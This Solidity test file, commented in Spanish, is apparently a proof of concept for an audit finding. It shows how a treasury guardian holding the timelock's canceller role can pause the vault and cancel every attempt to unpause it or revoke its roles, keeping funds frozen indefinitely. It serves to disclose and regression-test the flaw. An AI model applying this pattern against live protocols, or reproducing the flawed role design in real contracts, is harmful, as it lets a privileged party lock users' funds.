// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {TimelockController} from "@openzeppelin/contracts/governance/TimelockController.sol";
import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";
import {PocBase} from "./PocBase.sol";

/// @title PoC GT-01: el guardián congela los fondos sin límite
/// @notice Hallazgo GT-01 (Media). El guardián pausa al instante y, como también tiene
///         CANCELLER_ROLE en el timelock, cancela cada intento de reanudar o de quitarle el rol.
/// @dev Este test PASA mientras el ataque funcione. Cuando la v2 lo corrija, tiene que fallar
///      y se invierte como test de regresión.
contract PoC_GT01_GuardianCongela is PocBase {
    /// @notice El guardián pausa y cancela, ronda tras ronda, el unpause, la revocación de su
    ///         GUARDIAN_ROLE en la tesorería y la de su CANCELLER_ROLE en el timelock.
    /// @dev Un test no puede probar "para siempre". Prueba que cada intento se puede cancelar
    ///      (3 rondas) y que el proponente no tiene un atajo: programar con menos de 72 h revierte.
    function test_PoC_GT01_GuardianCancelaCadaUnpause() public {
        vm.prank(guardian);
        treasury.pause();

        address[3] memory targets = [address(treasury), address(treasury), address(timelock)];
        bytes[3] memory payloads = [
            abi.encodeCall(treasury.unpause, ()),
            abi.encodeCall(treasury.revokeRole, (treasury.GUARDIAN_ROLE(), guardian)),
            abi.encodeCall(timelock.revokeRole, (timelock.CANCELLER_ROLE(), guardian))
        ];

        for (uint256 round; round < 3; ++round) {
            bytes32 salt = bytes32(round);
            bytes32[3] memory ids;

            // El proponente intenta las tres salidas legítimas...
            for (uint256 i; i < 3; ++i) {
                vm.prank(proposer);
                timelock.schedule(targets[i], 0, payloads[i], bytes32(0), salt, DELAY);
                ids[i] = timelock.hashOperation(targets[i], 0, payloads[i], bytes32(0), salt);
            }
            // ...y el guardián cancela las tres durante la espera.
            for (uint256 i; i < 3; ++i) {
                vm.prank(guardian);
                timelock.cancel(ids[i]);
            }

            // Pasadas las 72 h, ninguna se puede ejecutar: ya no existen.
            vm.warp(block.timestamp + DELAY + 1);
            for (uint256 i; i < 3; ++i) {
                vm.expectRevert(
                    abi.encodeWithSelector(
                        TimelockController.TimelockUnexpectedOperationState.selector,
                        ids[i],
                        bytes32(uint256(1) << uint8(TimelockController.OperationState.Ready))
                    )
                );
                vm.prank(proposer);
                timelock.execute(targets[i], 0, payloads[i], bytes32(0), salt);
            }
        }

        // Sin atajo: el timelock no acepta una espera menor a 72 h.
        vm.expectRevert(abi.encodeWithSelector(TimelockController.TimelockInsufficientDelay.selector, 0, DELAY));
        vm.prank(proposer);
        timelock.schedule(targets[0], 0, payloads[0], bytes32(0), bytes32("atajo"), 0);

        // Resultado: la bóveda sigue pausada con todo adentro y el guardián conserva sus roles.
        assertTrue(treasury.paused());
        assertEq(token.balanceOf(address(treasury)), INITIAL);
        assertTrue(treasury.hasRole(treasury.GUARDIAN_ROLE(), guardian));
        assertTrue(timelock.hasRole(timelock.CANCELLER_ROLE(), guardian));

        vm.expectRevert(Pausable.EnforcedPause.selector);
        vm.prank(operator);
        treasury.withdraw(beneficiary, 100e18);
    }
}
